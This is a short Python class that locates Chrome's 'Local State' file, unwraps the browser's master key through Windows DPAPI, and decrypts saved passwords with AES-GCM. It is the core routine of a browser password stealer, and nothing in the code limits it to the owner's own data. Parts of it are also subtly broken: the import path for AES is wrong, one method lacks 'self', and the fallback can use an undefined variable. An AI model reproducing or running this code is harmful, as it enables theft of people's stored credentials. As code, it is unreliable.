import base64
import win32crypt
import json
from Crypto import AES
import os

class DecryptGoogle:
    def fetching_encryption_key():
            
            # Local_computer_directory_path will
            # look like this below
            # C: => Users => <Your_Name> => AppData => 
            # Local => Google => Chrome => User Data => 
            # Local State
            
            local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google",
            "Chrome", "User Data", "Local State")
                                                        
            with open(local_computer_directory_path, "r", encoding="utf-8") as f:
                local_state_data = f.read()
                local_state_data = json.loads(local_state_data)

            # decoding the encryption key using base64
            encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])
            
            # remove Windows Data Protection API (DPAPI) str
            encryption_key = encryption_key[5:]
            
            # return decrypted key
            return win32crypt.CryptUnprotectData(
            encryption_key, None, None, None, 0)[1]

    def decrypt(self,passwd,chave):
        try:
            iv = passwd[3:15]
            password = passwd[15:]
            
            # generate cipher
            cipher = AES.new(chave, AES.MODE_GCM, iv)
            
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
    